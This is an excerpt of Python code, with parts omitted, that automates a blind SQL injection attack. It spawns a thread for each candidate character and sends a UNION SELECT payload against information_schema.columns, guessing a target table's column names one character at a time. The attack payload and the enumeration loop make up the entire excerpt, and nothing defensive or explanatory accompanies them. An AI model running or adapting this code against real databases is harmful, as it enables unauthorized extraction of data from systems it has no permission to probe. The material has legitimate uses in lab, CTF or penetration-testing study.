...
def sql_dump(table_name, payload):
    for char in char_set:
        x = threading.Thread(target=lambda que, table_name,
                             payload, char:
                             que.put(sql_query(table_name, payload, char)),
                             args=(que, table_name, payload, char))
        threads.append(x)
        x.start()
...
def sql_query(table_name, payload, char):
    query = "asdifj' UNION SELECT column_name FROM information_schema.columns WHERE table_name='" + \
            table_name + "' AND column_name LIKE '" + payload + char + "%"
